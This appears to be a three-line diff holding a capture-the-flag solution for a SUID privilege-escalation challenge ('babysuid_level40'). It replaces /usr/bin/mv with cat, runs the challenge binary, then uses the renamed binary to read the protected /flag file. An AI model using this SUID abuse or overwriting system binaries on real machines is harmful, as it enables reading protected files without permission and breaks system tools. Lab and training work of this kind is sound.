@@ -1,0 +1,3 @@
+mv /usr/bin/cat /usr/bin/mv
+/challenge/babysuid_level40
+mv /flag
